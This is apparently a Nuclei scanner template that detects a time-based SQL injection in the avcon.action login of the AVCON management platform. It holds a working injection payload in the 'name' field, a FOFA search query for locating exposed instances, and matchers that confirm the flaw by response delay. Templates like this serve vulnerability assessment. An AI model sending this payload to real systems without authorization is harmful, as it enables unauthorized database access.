id: avcon-xtgl-name-sqli

info:
  name: avcon 综合管理平台 - SQL 注入漏洞
  author: leadlife
  severity: high
  description: AVCON综合管理平台可以实现各种子系统图像集成管理和音视频交互操作,将图像传输、视频监控、指挥调度、视频会议等系统融合，AVCON综合管理平台avcon.action存在时间注入漏洞。
  reference:
    - https://github.com/wy876/wiki/blob/main/avcon%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
  metadata:
    veified: true
    fofa-qeury: title="AVCON-系统管理平台"
  tags: avcon,sqli,time

http:
  - raw:
      - |
        @timeout: 15s
        POST /avcon.action HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        User-Agent: User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)
        
        name=0'XOR({{mysql}})XOR'Z&password=u]H[ww6KrA9F.x-F

    payloads:
      mysql:
        - "if(now()=sysdate()%2Csleep(6)%2C0)"
               
    matchers:     
      - type: dsl
        name: mysql
        dsl:
          - "status_code_1 == 200 && duration >= 5 && duration <= 9 && contains(body,'登录失败,请查询您的信息输入是否正确') && contains(header,'text/plain')" 
